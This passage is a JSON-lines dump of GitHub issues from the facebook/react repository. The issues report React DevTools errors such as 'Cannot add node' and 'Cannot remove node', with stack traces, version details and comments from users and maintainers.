Cannot add node \"330\" because a node with that id is already in the Store.\r\nThe error was thrown emit@moz-extension://bbac5ce7-5760-41c7-8624-0d264d68a0c7/build/main.js:1:1141200\r\nv/this._wallUnlisten<@moz-extension://bbac5ce7-5760-41c7-8624-0d264d68a0c7/build/main.js:1:1142807\r\nbridgeListener@moz-extension://bbac5ce7-5760-41c7-8624-0d264d68a0c7/build/main.js:1:1552360"}, {"author": "mikaiyl", "body": "\r\nMacOS Sonoma 14.6.1\r\nEdge Version 128.0.2739.79 (Official build) (x86_64)\r\nDevTools 6.0.0-d66fa02a30\r\nreact 18.3.1\r\n\r\nUncaught Error: Cannot add node \"236\" because a node with that id is already in the Store.\r\nDismiss\r\nThe error was thrown at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1171894\r\n    at v.emit (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1141200)\r\n    at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1142807\r\n    at bridgeListener (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1552574)"}, {"author": "GlennAtCallinetic", "body": "I encountered the same issue because I had installed the React Developer Tools extension twice, likely from two different sources. Removing one of them resolved the issue for me."}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 31436, "issue_url": "https://github.com/facebook/react/issues/31436", "issue_title": "[DevTools Bug] Cannot remove node \"2546\" because no matching node was found in the Store.", "issue_author": "merehan1111", "issue_body": "### Website or app\n\ne-comerce\n\n### Repro steps\n\nlogin\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.0.1-c7c68ef842\n\n### Error message (automated)\n\nCannot remove node \"2546\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1173889\r\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1140783)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1142390\r\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1552529)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "cpholt", "body": "This happens every time I try to profile with react-dev-tools.  Exact same stack."}, {"author": "RohovDmytro", "body": "For years it 'some node is missing'. Damn. Frustrating as hell."}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 31743, "issue_url": "https://github.com/facebook/react/issues/31743", "issue_title": "[DevTools Bug] Cannot add node \"1\" because a node with that id is already in the Store.", "issue_author": "Nasrallah1997", "issue_body": "### Website or app\n\nExpo Go & Google Chrome\n\n### Repro steps\n\nAndroid Bundled 589ms node_modules\\expo-router\\entry.js (1 module)\r\n (NOBRIDGE) LOG  Bridgeless mode is enabled     \r\n INFO \r\n \ud83d\udca1 JavaScript logs will be removed from Metro in React Native 0.77! Please use React Native DevTools as your default tool. Tip: Type j in the terminal to open (requires Google Chrome or Microsoft Edge).\r\n (NOBRIDGE) WARN  Route \"./Colors.ts\" is missing the required default export. Ensure a React component is exported as default. [Component Stack]\r\n (NOBRIDGE) WARN  Route \"./TabBarIcon.tsx\" is missing the required default export. Ensure a React component is exported as default. [Component Stack]\r\n (NOBRIDGE) WARN  Route \"./useThemeColor.ts\" is missing the required default export. Ensure a React component is exported as default. [Component Stack]\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-core\n\n### DevTools version (automated)\n\n5.2.0-1717ab0171\n\n### Error message (automated)\n\nCannot add node \"1\" because a node with that id is already in the Store.\n\n### Error call stack (automated)\n\n```text\nat http://10.251.14.176:8081/_expo/react-devtools/standalone.js:2:1011371\r\n    at f.emit (http://10.251.14.176:8081/_expo/react-devtools/standalone.js:2:984358)\r\n    at http://10.251.14.176:8081/_expo/react-devtools/standalone.js:2:985900\r\n    at http://10.251.14.176:8081/_expo/react-devtools/standalone.js:2:1359186\r\n    at Array.forEach (<anonymous>)\r\n    at U_.e.onmessage (http://10.251.14.176:8081/_expo/react-devtools/standalone.js:2:1359169)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "VictorRutskin", "body": "@Nasrallah1997  note that this issue is a duplicate, there is a whole thread here: \r\nhttps://github.com/facebook/react/issues/27185\r\n\r\n"}, {"author": "VictorRutskin", "body": "@Nasrallah1997  the first solution here did it for me.\r\nhttps://stackoverflow.com/questions/71494734/devtools-bug-cannot-add-node-1-because-a-node-with-that-id-is-already-in-the/79287333#79287333"}, {"author": "Pooja-Vr", "body": "https://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 31950, "issue_url": "https://github.com/facebook/react/issues/31950", "issue_title": "[DevTools Bug] Cannot remove node \"92\" because no matching node was found in the Store.", "issue_author": "TheOnly1TY", "issue_body": "### Website or app\n\nhttp://localhost:3000/\n\n### Repro steps\n\nI was trying to inspect my component tree via react dev tools, but each time I make an interaction on the website which changes the state, it throws an error \n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.0.1-c7c68ef842\n\n### Error message (automated)\n\nCannot remove node \"92\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1173889\r\n    at v.emit (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1140783)\r\n    at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1142390\r\n    at bridgeListener (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1552662)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "DominicCronin", "body": "I have seen a similar error running version 6.0.0 on Firefox 133.0.3\r\n\r\nThe error was thrown emit@moz-extension://550a33a5-59ea-4600-a45c-cc050a60e3cd/build/main.js:1:1141200\r\nv/this._wallUnlisten<@moz-extension://550a33a5-59ea-4600-a45c-cc050a60e3cd/build/main.js:1:1142807\r\nbridgeListener@moz-extension://550a33a5-59ea-4600-a45c-cc050a60e3cd/build/main.js:1:1552360"}, {"author": "adi-ydv-1", "body": "@TheOnly1TY  host your code and then share the link not your locally run app link."}, {"author": "Rohanpatil7", "body": "just ignore that massage \r\n"}, {"author": "TheOnly1TY", "body": "Ok\nThank you"}, {"author": "aesgdo", "body": "Uncaught Error: Cannot remove node \"225\" because no matching node was found in the Store.\nDismiss\nThe error was thrown at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1193929\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1160378)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1161985\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1572692)"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 32750, "issue_url": "https://github.com/facebook/react/issues/32750", "issue_title": "[DevTools Bug] Cannot add node \"29\" because a node with that id is already in the Store.", "issue_author": "Gontse7", "issue_body": "### Website or app\n\nhttps://github.com/Gontse7/pyga\n\n### Repro steps\n\nI was trying to debug the website as it in production to see what was wrong with some components and props\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.1-44c3d3d665\n\n### Error message (automated)\n\nCannot add node \"29\" because a node with that id is already in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1192232\n    at v.emit (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1160378)\n    at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1161985\n    at bridgeListener (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1572825)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "sergiotales1", "body": "I saw that the issue was made 8 days ago but your GitHub repository's last commit happened 16 days ago and has some incomplete files there.\n\nAre you still facing this issue? If so please update the repository, I will fork it to see if I can help!"}, {"author": "DanielSchiavini", "body": "The extension often crashes on me mainly if I leave it open during page reload.\nCurrently working on https://github.com/curvefi/curve-frontend\n\n![Image](https://github.com/user-attachments/assets/b155a816-0486-4519-b9f6-4484936f23ab)"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 32964, "issue_url": "https://github.com/facebook/react/issues/32964", "issue_title": "[DevTools Bug] Cannot remove node \"107\" because no matching node was found in the Store.", "issue_author": "heyitsdurdona", "issue_body": "### Website or app\n\nlocalhost:5173\n\n### Repro steps\n\nI was trying to inspect my component tree via react DevTools, but when I make an interaction on the website which makes changes to  the state, it throws an error\n\n### How often does this bug happen?\n\nOnly once\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.1-44c3d3d665\n\n### Error message (automated)\n\nCannot remove node \"107\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1193929\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1160378)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1161985\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1572692)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "Franciscorsil", "body": "Did you find a fix for this?\nIm also having this error"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 33322, "issue_url": "https://github.com/facebook/react/issues/33322", "issue_title": "[DevTools Bug] Cannot remove node \"25\" because no matching node was found in the Store.", "issue_author": "vinaymarati", "issue_body": "### Website or app\n\nhttps://vinaykumardku2zrjsivsfcbc.drops.nxtwave.tech/\n\n### Repro steps\n\n.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.2-4d6cf75921\n\n### Error message (automated)\n\nCannot remove node \"25\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1228673\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1195122)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1196729\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1607819)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "zhg163", "body": "Thank you for reporting this issue. Could you please provide more information about your React and React DevTools versions? This would help in investigating the problem."}, {"author": "skylarmb", "body": "I am seeing this intermittently as well. \n\n- Firefox 138.0.4\n- React 19.1.0\n- React Developer Tools 6.0.0\n\nSeems to happen if I have react devtools open when I load / reload the page. If I open them after loading the page it seems to work? "}, {"author": "janvorwerk", "body": "Seems very much related to #32852  I get these errors all the time => the profiler is pretty much unusable \ud83d\ude22"}, {"author": "Hardanish-Singh", "body": "Looks like its related to https://github.com/facebook/react/issues/32852"}, {"author": "AstralHunt", "body": "These \"Cannot Remove node ... found in Store\" issues are prevalent..."}, {"author": "Ahmard", "body": "> I am seeing this intermittently as well.\n> \n>     * Firefox 138.0.4\n> \n>     * React 19.1.0\n> \n>     * React Developer Tools 6.0.0\n> \n> \n> Seems to happen if I have react devtools open when I load / reload the page. If I open them after loading the page it seems to work?\n\nHaving same behavior here as well, it only happens when you open the devtool and reload the page."}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 34600, "issue_url": "https://github.com/facebook/react/issues/34600", "issue_title": "[DevTools Bug] Cannot add child \"43538\" to parent \"35533\" because parent node was not found in the Store.", "issue_author": "gpage-cnr", "issue_body": "### Website or app\n\nPrivate software development - sorry\n\n### Repro steps\n\nTrying to inspect a component.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.5-5d87cd2244\n\n### Error message (automated)\n\nCannot add child \"43538\" to parent \"35533\" because parent node was not found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1237326\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1203447)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1205054\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1620565)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add child  to parent  because parent node was not found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Could you please upgrade to version 7 and check if it is still reproducible?"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 34138, "issue_url": "https://github.com/facebook/react/issues/34138", "issue_title": "[DevTools Bug] Cannot remove node \"10\" because no matching node was found in the Store.", "issue_author": "leeshiela", "issue_body": "### Website or app\n\nhttps://github.com/leeshiela/calendar-component-options\n\n### Repro steps\n\nUsing the Profiler on my localhost:3000 produced an error while on a specific branch. Steps to reproduce the bug:\n\n1. `git clone` the above url and `npm install`\n2. `git checkout` to the `react-aria-datepicker` branch\n3.  `npm run dev`\n4. Open DevTools and switch to Profiler with React DevTools Extension\n5. Hit the rerun button to refresh and rerun Profiler.\n6. Error should occur\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.5-5d87cd2244\n\n### Error message (automated)\n\nCannot remove node \"10\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1238165\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1203447)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1205054\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1620565)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Hey, thanks for reporting this.\n\nI couldn't reproduce it with React DevTools v7, @leeshiela could you please upgrade your extension and check if it is fixed?"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 34128, "issue_url": "https://github.com/facebook/react/issues/34128", "issue_title": "[DevTools Bug] Cannot add node \"1\" because a node with that id is already in the Store.", "issue_author": "ecobanoglu", "issue_body": "### Website or app\n\nlocalhost\n\n### Repro steps\n\nmessages\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.5-5d87cd2244\n\n### Error message (automated)\n\nCannot add node \"1\" because a node with that id is already in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1236392\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1203447)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1205054\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1620565)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hpAnalytics", "body": "?????"}, {"author": "eps1lon", "body": "Is this in an app that is using Server-side rendering and hydration? This particular bug may have been fixed in https://github.com/facebook/react/pull/34209"}, {"author": "apuatcfbd", "body": "> Uncaught Error: Cannot add node \"13\" because a node with that id is already in the Store.\n\nWhat is the Issue?"}, {"author": "chanzer0", "body": "I am also running into this issue when trying to run the Profiler tab.\n\n### Website or app\nlocalhost\n\n### Repro steps\nOpen the \"Profiler\" tab and click the \"Reload and start profiling\" icon.\n\n### How often does this bug happen?\nEvery time\n\n### DevTools package\nreact-developer-tools Chrome extension \n\n### DevTools version\n6.1.5 (7/4/2025) - 5d87cd2244\n\n### Chrome version\nVersion 140.0.7339.186 (Official Build) (64-bit)\n\n### React version\n19.1.1\n\n### Error message\n`Uncaught Error: Cannot add node \"13\" because a node with that id is already in the Store.`\n\nError call stack (automated)\n```\nThe error was thrown at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1236392\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1203447)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1205054\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1620565)\n```\n"}, {"author": "hoxyq", "body": "Anyone who is still seeing this issue, could you please upgrade to React DevTools v7 and check it it is still reproducible?"}, {"author": "Juanjo4U", "body": "> Anyone who is still seeing this issue, could you please upgrade to React DevTools v7 and check it it is still reproducible?\n\nI'm still facing that error on latest version"}, {"author": "hoxyq", "body": "> I'm still facing that error on latest version\n\nIs there a reproducer that you could share?\n"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 27186, "issue_url": "https://github.com/facebook/react/issues/27186", "issue_title": "[DevTools Bug] Node \"24\" was removed before its children.", "issue_author": "anmol-fzr", "issue_body": "### Website or app\n\nhttps://super-visa-insurance.netlify.app/\n\n### Repro steps\n\nI'm Facing an Issue in my Nextjs 13.4.12  project, main tag is automatically removed in from the page. \r\nBefore this I changed my zustand store with react-query for caching results, but I reverted these changes because I was facing this issue, but after reverting I still face this issue\r\n\n\n### How often does this bug happen?\n\nSometimes\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n4.28.0-035a41c4e\n\n### Error message (automated)\n\nNode \"24\" was removed before its children.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:28315:43\r\n    at Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24827:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24996:14\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:57406:39)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Node  was removed before its children. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "abhinav-nav", "body": "//The error message \"Node 24 was removed before its children\" means that a React component was removed from the DOM before its child components were removed. This can happen if the parent component is removed by code, or if the user navigates away from the page.\r\n\r\n//In your case, the main tag is being removed from the page, which means that the entire React app is being removed. This could be caused by a number of things, such as a bug in your code, a problem with your React configuration, or a problem with your hosting environment.\r\n\r\nTo troubleshoot this issue, you can try the following::::\r\n\r\n* Check your code for any errors that could be causing the main tag to be removed.\r\n* Check your React configuration to make sure that it is set up correctly.\r\n* Check your hosting environment to make sure that it is compatible with React.\r\n\r\nIf you are still unable to resolve the issue, you can try searching the React documentation or Stack Overflow for more information. You can also file an issue on the React GitHub repository.\r\n\r\nHere are some GitHub issues that I found that match your search criteria:\r\n\r\n* https://github.com/facebook/react/issues/23202\r\n* https://github.com/facebook/react/issues/21563\r\n* https://github.com/facebook/react/issues/25884\r\n* https://github.com/facebook/react/issues/24818\r\n"}, {"author": "hoxyq", "body": "Hey @anmol-fzr, thanks for reporting this issue.\r\n\r\n> main tag is automatically removed in from the page\r\n\r\nWhat do you mean by this?\r\n\r\nCan you please try to provide small reproducible example of this error?"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 23202, "issue_url": "https://github.com/facebook/react/issues/23202", "issue_title": "[DevTools Bug] Cannot remove node \"612\" because no matching node was found in the Store.", "issue_author": "steve-snow", "issue_body": "### Website or app\n\nproprietary\n\n### Repro steps\n\nOverall, testing and refactoring of a component containing a formik wrapped form which includes a fieldarray with yup schema.\r\nUsing VS Code to serve the  React js application.\r\n\r\nUnable to share the repo / website as it is proprietary.\r\n\r\nTask: Logged in to the app to see the form as the specific user role required to see the component, testing yup schema on formik elements touched property to do some custom error connections in the containing component with React Developer Tools open to the Components view with the console also open.  \r\n\r\nI was verifying the elements described in the schema file were getting 'touched' and was refining a select in yup schema js file.\r\n\r\nSwitched one element's schema property from yup.object() to yup.int() triggers the error.  This is a syntax error.  Should be yup.number().  But switching the two causes it all to crash.\r\n\r\n \"formik\": \"^2.2.6\",\r\n  \"prop-types\": \"^15.7.2\",\r\n  \"react\": \"^17.0.2\",\r\n  \"react-router-dom\": \"4.3.1\",\r\n  \"react-select\": \"^4.3.0\",\r\n  \"yup\": \"^0.26.10\"\r\n  \"yarn\": \"^1.13.0\",\r\n\r\n  \"babel-eslint\": \"^10.1.0\",\r\n\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n4.23.0-e28a0db22\n\n### Error message (automated)\n\nCannot remove node \"612\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:26349:43\r\n    at bridge_Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24415:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24581:14\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:54033:39)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Resolution: Needs More Information", "Component: Developer Tools"], "comments": [{"author": "bvaughn", "body": "Unfortunately \"proprietary\" isn't a repro we can do anything with. Handing this back to you in hopes of getting something we can repro and look into, @steve-snow.\r\n\r\nGenerally it's helpful to reduce the problem locally to as little code as you can (including dependencies) and then host it on Code Sandbox."}, {"author": "RobIsHere", "body": "I can confirm that I have the same issue."}, {"author": "RobIsHere", "body": "It also happens when I fill in a form field. As soon as this happens, parameters given to my component change and this bug immediately appears every time."}, {"author": "lunaruan", "body": "@RobIsHere Thanks for commenting! Unfortunately, without a reproducible repro on our side, we're unable to debug this issue. Could you create a repro of this on Code Sandbox? Thanks!"}, {"author": "steve-snow", "body": "I will try to create a repo, but may not happen until this weekend.\nSteve\n\nOn Mon, Jan 31, 2022 at 7:57 AM Luna Ruan ***@***.***> wrote:\n\n> @RobIsHere <https://github.com/RobIsHere> Thanks for commenting!\n> Unfortunately, without a reproducible repro on our side, we're unable to\n> debug this issue. Could you create a repro of this on Code Sandbox? Thanks!\n>\n> \u2014\n> Reply to this email directly, view it on GitHub\n> <https://github.com/facebook/react/issues/23202#issuecomment-1025931957>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AIJGYZH5JM6SB3MZGU4QLHDUY2WNNANCNFSM5M7B2JVQ>\n> .\n> Triage notifications on the go with GitHub Mobile for iOS\n> <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n> or Android\n> <https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>.\n>\n> You are receiving this because you were assigned.Message ID:\n> ***@***.***>\n>\n"}, {"author": "lunaruan", "body": "Thanks so much! That would be a huge help \ud83d\ude0a"}, {"author": "ariccio", "body": "I've been seeing this a lot myself lately! It looks like others have been seeing variations of it too:\r\nhttps://github.com/facebook/react/issues/21527\r\nhttps://github.com/facebook/react/issues/21529\r\nhttps://github.com/facebook/react/issues/21534\r\nhttps://github.com/facebook/react/issues/21563\r\nhttps://github.com/facebook/react/issues/21568\r\nhttps://github.com/facebook/react/issues/21636\r\nhttps://github.com/facebook/react/issues/21653\r\nhttps://github.com/facebook/react/issues/21755 (FYI I'm running `4.23.0`)\r\nhttps://github.com/facebook/react/issues/21764\r\nhttps://github.com/facebook/react/issues/22611\r\n\r\n\r\nFor a bug like this, maybe we need some better diagnostics? I can't identify any individual change in my code that made this happen."}, {"author": "steve-snow", "body": "This is going to take a bit more work to find the culprit. \r\nStarting with the basic react app and adding yup and formik did not cause the fatal crash with the syntax error trigger.  You will see the same yup error.  So I'll be iterating through the package.json differences until I get something that blows it up.  For now, this is the starting point.  But it is not the fatal error I was hoping to find.\r\n\r\nSpecifically, the syntax trigger was to change the following in the schema file:\r\n\r\n`    age: Yup.number()`\r\n\r\nto \r\n\r\n`    age: Yup.int()`\r\n\r\nhttps://github.com/steve-snow/react-validation-glitch-testing.git"}, {"author": "gibin-george-supersourcing", "body": "The error was thrown at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:26448:43\r\n    at bridge_Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24400:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24566:14\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:54300:39)"}, {"author": "kux888", "body": "Everything was normal until today"}, {"author": "bvaughn", "body": "Hello everyone!\r\n\r\nWe are sorry to hear that this issue is affecting several people. It would help us a lot though if your comments contained the following information:\r\n* Which version of React DevTools are you using?\r\n* Which version of React/ReactDOM are you using?\r\n* How can we repro the problem you're seeing? (Give us a URL or a project we can check out or run.)\r\n\r\nWithout the info above, **we can't help you** even though we want to.\r\n\r\ncc @gibin-george-supersourcing @kux888 @ariccio @RobIsHere "}, {"author": "mrkev", "body": "Unfortunately, I'm seeing this issue at work so I can't share a URL/project. It happens every time I open the tools; they're inaccesible to me at the moment. Will at least share version info in hopes it's useful:\r\n\r\nReact DevTools: 4.13.5 